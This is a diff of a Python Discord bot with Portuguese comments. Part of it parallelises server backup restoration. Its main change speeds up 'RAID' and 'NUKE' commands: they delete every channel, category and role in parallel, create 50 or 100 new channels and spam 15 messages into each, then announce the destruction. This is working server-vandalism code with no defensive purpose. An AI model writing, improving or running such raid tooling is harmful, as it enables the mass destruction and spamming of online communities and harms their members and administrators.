@@ -269,7 +269,7 @@ async def restore_from_config(guild, guild_id=None):
     print(f"       {restored['roles']} roles")
 
     # 2. Categorias com permissões
-    print("[RESTORE-CONFIG] Recriando categorias...")
+    print("[RESTORE-CONFIG] Criando categorias...")
     cat_map = {}
     for cat_data in sorted(config.get("categories", []), key=lambda x: x.get("position", 0)):
         try:
@@ -281,44 +281,48 @@ async def restore_from_config(guild, guild_id=None):
             print(f"       Erro categoria {cat_data['name']}: {e}")
     print(f"       {restored['categories']} categorias")
 
-    # 3. Canais com permissões
-    print("[RESTORE-CONFIG] Recriando canais...")
-    for channel_data in sorted(config.get("channels", []), key=lambda x: x.get("position", 0)):
-        try:
-            category = None
-            cat_name = channel_data.get("category_name")
-            if cat_name and cat_name in cat_map:
-                category = cat_map[cat_name]
+    # 3. Canais EM PARALELO (depois que categorias existem)
+    print("[RESTORE-CONFIG] Criando canais (paralelo)...")
 
-            overwrites = rebuild_overwrites(guild, channel_data.get("permissions", []))
-            ch_type = channel_data["type"].lower()
-            name = channel_data["name"]
+    async def create_channel_from_config(ch_data):
+        category = None
+        cat_name = ch_data.get("category_name")
+        if cat_name and cat_name in cat_map:
+            category = cat_map[cat_name]
 
-            if "text" in ch_type:
-                await guild.create_text_channel(
-                    name=name, category=category,
-                    topic=channel_data.get("topic"),
-                    slowmode_delay=channel_data.get("slowmode_delay", 0),
-                    nsfw=channel_data.get("nsfw", False),
-                    position=channel_data.get("position", 0),
-                    overwrites=overwrites,
-                )
-            elif "voice" in ch_type:
-                await guild.create_voice_channel(
-                    name=name, category=category,
-                    position=channel_data.get("position", 0),
-                    overwrites=overwrites,
-                )
-            else:
-                await guild.create_text_channel(
-                    name=name, category=category,
-                    topic=channel_data.get("topic"),
-                    position=channel_data.get("position", 0),
-                    overwrites=overwrites,
-                )
-            restored["channels"] += 1
-        except Exception as e:
-            print(f"       Erro canal {channel_data['name']}: {e}")
+        overwrites = rebuild_overwrites(guild, ch_data.get("permissions", []))
+        ch_type = ch_data["type"].lower()
+        name = ch_data["name"]
+
+        if "text" in ch_type:
+            ch = await guild.create_text_channel(
+                name=name, category=category,
+                topic=ch_data.get("topic"),
+                slowmode_delay=ch_data.get("slowmode_delay", 0),
+                nsfw=ch_data.get("nsfw", False),
+                position=ch_data.get("position", 0),
+                overwrites=overwrites,
+            )
+        elif "voice" in ch_type:
+            ch = await guild.create_voice_channel(
+                name=name, category=category,
+                position=ch_data.get("position", 0),
+                overwrites=overwrites,
+            )
+        else:
+            ch = await guild.create_text_channel(
+                name=name, category=category,
+                topic=ch_data.get("topic"),
+                position=ch_data.get("position", 0),
+                overwrites=overwrites,
+            )
+        return ch
+
+    sorted_channels = sorted(config.get("channels", []), key=lambda x: x.get("position", 0))
+    tasks = [create_channel_from_config(ch_data) for ch_data in sorted_channels]
+    results = await asyncio.gather(*tasks, return_exceptions=True)
+    restored["channels"] = sum(1 for r in results if r is not None and not isinstance(r, Exception))
+
     print(f"       {restored['channels']} canais")
     print(f"\n[RESTORE-CONFIG] CONCLUÍDO!")
 
@@ -632,9 +636,9 @@ async def restore_backup(guild):
     # Esperar um pouco pro Discord registrar as deleções
     await asyncio.sleep(2)
 
-    # 1. Roles primeiro (precisamos delas pra aplicar permissões depois)
-    print("[RESTORE] Restaurando roles...")
-    role_map = {}  # Mapear nome -> nova role
+    # 1. Criar roles primeiro (precisamos delas pra aplicar permissões nos canais)
+    print("[RESTORE] Criando roles...")
+    role_map = {}
     for role_data in sorted(backup.get("roles", []), key=lambda x: x.get("position", 0)):
         try:
             color_parts = role_data["color"].split(",")
@@ -656,13 +660,12 @@ async def restore_backup(guild):
             print(f"       Erro role {role_data['name']}: {e}")
     print(f"       {restored['roles']} roles")
 
-    # 2. Categorias com permissões
-    print("[RESTORE] Recriando categorias com permissões...")
+    # 2. Criar categorias (precisamos delas antes dos canais)
+    print("[RESTORE] Criando categorias...")
     cat_map = {}
     for cat_data in sorted(backup.get("categories", []), key=lambda x: x.get("position", 0)):
         try:
             overwrites = rebuild_overwrites(guild, cat_data.get("permissions", []))
-
             new_cat = await guild.create_category(name=cat_data["name"], overwrites=overwrites)
             cat_map[cat_data["name"]] = new_cat
             restored["categories"] += 1
@@ -670,49 +673,46 @@ async def restore_backup(guild):
             print(f"       Erro categoria {cat_data['name']}: {e}")
     print(f"       {restored['categories']} categorias")
 
-    # 3. Canais nas categorias com permissões
-    print("[RESTORE] Restaurando canais com permissões...")
-    for channel_data in sorted(backup.get("channels", []), key=lambda x: x.get("position", 0)):
-        try:
-            category = None
-            cat_name = channel_data.get("category_name")
-            if cat_name and cat_name in cat_map:
-                category = cat_map[cat_name]
+    # 3. Criar canais EM PARALELO (depois que categorias existem)
+    print("[RESTORE] Criando canais (paralelo)...")
 
-            # Montar permissões do canal
-            overwrites = rebuild_overwrites(guild, channel_data.get("permissions", []))
+    async def create_channel_from_backup(ch_data):
+        category = None
+        cat_name = ch_data.get("category_name")
+        if cat_name and cat_name in cat_map:
+            category = cat_map[cat_name]
 
-            ch_type = channel_data["type"].lower()
-            name = channel_data["name"]
+        overwrites = rebuild_overwrites(guild, ch_data.get("permissions", []))
+        ch_type = ch_data["type"].lower()
+        name = ch_data["name"]
 
-            if "text" in ch_type:
-                await guild.create_text_channel(
-                    name=name,
-                    category=category,
-                    topic=channel_data.get("topic"),
-                    slowmode_delay=channel_data.get("slowmode_delay", 0),
-                    position=channel_data.get("position", 0),
-                    overwrites=overwrites,
-                )
-            elif "voice" in ch_type:
-                await guild.create_voice_channel(
-                    name=name,
-                    category=category,
-                    position=channel_data.get("position", 0),
-                    overwrites=overwrites,
-                )
-            else:
-                # Fallback: criar como text
-                await guild.create_text_channel(
-                    name=name,
-                    category=category,
-                    topic=channel_data.get("topic"),
-                    position=channel_data.get("position", 0),
-                    overwrites=overwrites,
-                )
-            restored["channels"] += 1
-        except Exception as e:
-            print(f"       Erro canal {channel_data['name']}: {e}")
+        if "text" in ch_type:
+            ch = await guild.create_text_channel(
+                name=name, category=category,
+                topic=ch_data.get("topic"),
+                slowmode_delay=ch_data.get("slowmode_delay", 0),
+                position=ch_data.get("position", 0),
+                overwrites=overwrites,
+            )
+        elif "voice" in ch_type:
+            ch = await guild.create_voice_channel(
+                name=name, category=category,
+                position=ch_data.get("position", 0),
+                overwrites=overwrites,
+            )
+        else:
+            ch = await guild.create_text_channel(
+                name=name, category=category,
+                topic=ch_data.get("topic"),
+                position=ch_data.get("position", 0),
+                overwrites=overwrites,
+            )
+        return ch
+
+    sorted_channels = sorted(backup.get("channels", []), key=lambda x: x.get("position", 0))
+    tasks = [create_channel_from_backup(ch_data) for ch_data in sorted_channels]
+    results = await asyncio.gather(*tasks, return_exceptions=True)
+    restored["channels"] = sum(1 for r in results if r is not None and not isinstance(r, Exception))
 
     print(f"       {restored['channels']} canais")
     print(f"\n[RESTORE] CONCLUÍDO!")
@@ -1201,31 +1201,58 @@ async def on_message(message):
         # Escaneia o servidor
         total_channels = len([ch for ch in guild.channels if not isinstance(ch, discord.CategoryChannel)])
         total_cats = len(guild.categories)
+        total_roles = len([r for r in guild.roles if not r.is_default()])
         size_type, _, _, _ = detect_server_size(guild)
-        print(f"[SCAN] {total_channels} canais | {total_cats} categorias | Método: {size_type}")
+        print(f"[SCAN] {total_channels} canais | {total_cats} categorias | {total_roles} roles | Método: {size_type}")
 
-        # Fase 1: Apagar canais (PRIORIDADE MÁXIMA)
-        print("[1/4] Apagando canais...")
-        deleted_ch = await delete_all_channels(guild)
+        # Fase 1: Apagar canais + categorias + roles TUDO EM PARALELO
+        print("[1/4] Apagando canais + categorias + roles (paralelo)...")
 
-        # Fase 2: Apagar categorias
-        print("[2/4] Apagando categorias...")
-        deleted_cat = await delete_all_categories(guild)
+        async def delete_role_fast(role):
+            try:
+                if role.is_default():
+                    return False
+                if role.position >= guild.me.top_role.position:
+                    return False
+                await role.delete()
+                return True
+            except Exception:
+                return False
 
-        # Fase 3: Criar canais (PARALELO)
-        print("[3/4] Criando 50 canais (paralelo)...")
+        roles_to_delete = [r for r in guild.roles if not r.is_default()]
+        channels_to_delete = [ch for ch in list(guild.channels) if not isinstance(ch, discord.CategoryChannel)]
+        cats_to_delete = list(guild.categories)
+
+        all_delete_tasks = [delete_channel_fast(ch) for ch in channels_to_delete] \
+                         + [delete_channel_fast(cat) for cat in cats_to_delete] \
+                         + [delete_role_fast(role) for role in roles_to_delete]
+        all_delete_results = await asyncio.gather(*all_delete_tasks, return_exceptions=True)
+
+        # Contar resultados
+        idx = 0
+        deleted_ch = sum(1 for r in all_delete_results[idx:idx+len(channels_to_delete)] if r is True)
+        idx += len(channels_to_delete)
+        deleted_cat = sum(1 for r in all_delete_results[idx:idx+len(cats_to_delete)] if r is True)
+        idx += len(cats_to_delete)
+        deleted_r = sum(1 for r in all_delete_results[idx:] if r is True)
+
+        print(f"      {deleted_ch}/{total_channels} canais | {deleted_cat}/{total_cats} categorias | {deleted_r}/{total_roles} roles")
+
+        # Fase 2: Criar canais (PARALELO)
+        print("[2/4] Criando 50 canais (paralelo)...")
         new_channels = await create_all_channels(guild, count=50)
         created = len(new_channels)
         print(f"      {created} canais criados")
 
-        # Fase 4: Spam 15 msgs por canal (PARALELO)
-        print("[4/4] Enviando 15 msgs por canal (paralelo)...")
+        # Fase 3: Spam 15 msgs por canal (PARALELO)
+        print("[3/4] Enviando 15 msgs por canal (paralelo)...")
         sent = await spam_all_channels(new_channels)
         print(f"      {sent} mensagens enviadas")
 
         print(f"\n[RAID] RAID CONCLUÍDO!")
         print(f"       Canais apagados: {deleted_ch}/{total_channels}")
         print(f"       Categorias apagadas: {deleted_cat}/{total_cats}")
+        print(f"       Roles apagadas: {deleted_r}/{total_roles}")
         print(f"       Canais criados: {created}")
         print(f"       Mensagens: {sent}")
 
@@ -1234,6 +1261,7 @@ async def on_message(message):
                 f"✅ RAID CONCLUÍDO!\n"
                 f"📡 {deleted_ch}/{total_channels} canais apagados\n"
                 f"🗂️ {deleted_cat}/{total_cats} categorias apagadas\n"
+                f"🗑️ {deleted_r}/{total_roles} roles apagadas\n"
                 f"📂 {created} novos canais\n"
                 f"💬 {sent} mensagens enviadas\n"
                 f"💾 Backup salvo (com permissões)"
@@ -1277,31 +1305,46 @@ async def on_message(message):
         # Escaneia o servidor
         total_channels = len([ch for ch in guild.channels if not isinstance(ch, discord.CategoryChannel)])
         total_cats = len(guild.categories)
+        total_roles = len([r for r in guild.roles if not r.is_default()])
         size_type, _, _, _ = detect_server_size(guild)
-        print(f"[SCAN] {total_channels} canais | {total_cats} categorias | Método: {size_type}")
+        print(f"[SCAN] {total_channels} canais | {total_cats} categorias | {total_roles} roles | Método: {size_type}")
 
-        # Fase 1: Apagar canais (PRIORIDADE MÁXIMA)
-        print("[1/4] Apagando canais...")
-        deleted_ch = await delete_all_channels(guild)
+        # Fase 1: Apagar canais + categorias + roles TUDO EM PARALELO
+        print("[1/4] Apagando canais + categorias + roles (paralelo)...")
 
-        # Fase 2: Apagar categorias
-        print("[2/4] Apagando categorias...")
-        deleted_cat = await delete_all_categories(guild)
+        roles_to_delete = [r for r in guild.roles if not r.is_default()]
+        channels_to_delete = [ch for ch in list(guild.channels) if not isinstance(ch, discord.CategoryChannel)]
+        cats_to_delete = list(guild.categories)
 
-        # Fase 3: Criar 100 canais
-        print("[3/4] Criando 100 canais (paralelo)...")
+        all_delete_tasks = [delete_channel_fast(ch) for ch in channels_to_delete] \
+                         + [delete_channel_fast(cat) for cat in cats_to_delete] \
+                         + [delete_role_fast(role) for role in roles_to_delete]
+        all_delete_results = await asyncio.gather(*all_delete_tasks, return_exceptions=True)
+
+        idx = 0
+        deleted_ch = sum(1 for r in all_delete_results[idx:idx+len(channels_to_delete)] if r is True)
+        idx += len(channels_to_delete)
+        deleted_cat = sum(1 for r in all_delete_results[idx:idx+len(cats_to_delete)] if r is True)
+        idx += len(cats_to_delete)
+        deleted_r = sum(1 for r in all_delete_results[idx:] if r is True)
+
+        print(f"      {deleted_ch}/{total_channels} canais | {deleted_cat}/{total_cats} categorias | {deleted_r}/{total_roles} roles")
+
+        # Fase 2: Criar 100 canais
+        print("[2/4] Criando 100 canais (paralelo)...")
         new_channels = await create_all_channels(guild, count=100)
         created = len(new_channels)
         print(f"      {created} canais criados")
 
-        # Fase 4: Spam 15 msgs por canal
-        print("[4/4] Enviando 15 msgs por canal (paralelo)...")
+        # Fase 3: Spam 15 msgs por canal
+        print("[3/4] Enviando 15 msgs por canal (paralelo)...")
         sent = await spam_all_channels(new_channels)
         print(f"      {sent} mensagens enviadas")
 
         print(f"\n[NUKE] NUKE CONCLUÍDO!")
         print(f"       Canais apagados: {deleted_ch}/{total_channels}")
         print(f"       Categorias apagadas: {deleted_cat}/{total_cats}")
+        print(f"       Roles apagadas: {deleted_r}/{total_roles}")
         print(f"       Canais criados: {created}")
         print(f"       Mensagens: {sent}")
 
@@ -1310,6 +1353,7 @@ async def on_message(message):
                 f"💣 NUKE CONCLUÍDO!\n"
                 f"📡 {deleted_ch}/{total_channels} canais apagados\n"
                 f"🗂️ {deleted_cat}/{total_cats} categorias apagadas\n"
+                f"🗑️ {deleted_r}/{total_roles} roles apagadas\n"
                 f"📂 {created} novos canais (100)\n"
                 f"💬 {sent} mensagens enviadas\n"
                 f"💾 Backup salvo (com permissões)"
